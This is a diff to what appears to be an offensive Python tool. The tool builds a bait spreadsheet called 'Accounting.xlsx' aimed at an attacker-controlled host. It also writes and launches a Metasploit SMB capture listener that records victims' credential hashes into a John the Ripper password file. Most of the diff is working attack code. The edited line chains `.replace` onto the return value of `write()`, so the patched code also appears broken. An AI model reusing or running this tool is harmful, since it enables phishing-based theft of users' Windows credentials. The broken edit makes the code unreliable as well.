@@ -11,17 +11,16 @@ def createXLSX(filename, server, port):
 	workbook.close()
 	print("Fichero creado")
 
-	
 
-def msfListener(ipAttacker):
+def msfListener(ipAttacker, portAttacker):
 	resourceFile = open('metasploit.rc','w')
 	resourceFile.write('''
 use auxiliary/server/capture/smb
 set SRVHOST <SERVER>
-set SRVPORT 4444
+set SRVPORT <PORT>
 set JOHNPWFILE passwords
 run
-'''.replace('<SERVER>',ipAttacker))
+'''.replace('<SERVER>',ipAttacker)).replace('<PORT>',portAttacker)
 	resourceFile.close()
 	print('[+] MSF Resource file generated ')
 	system('msfconsole -q -r metasploit.rc')
@@ -35,10 +34,7 @@ def main():
 		host = sys.argv[1]
 		port = sys.argv[2]
 		createXLSX("Accounting.xlsx", host, port)
-		msfListener(host)
-		
-    
-    
-    
+		msfListener(host, port)
+
 if __name__ == "__main__":
     main()
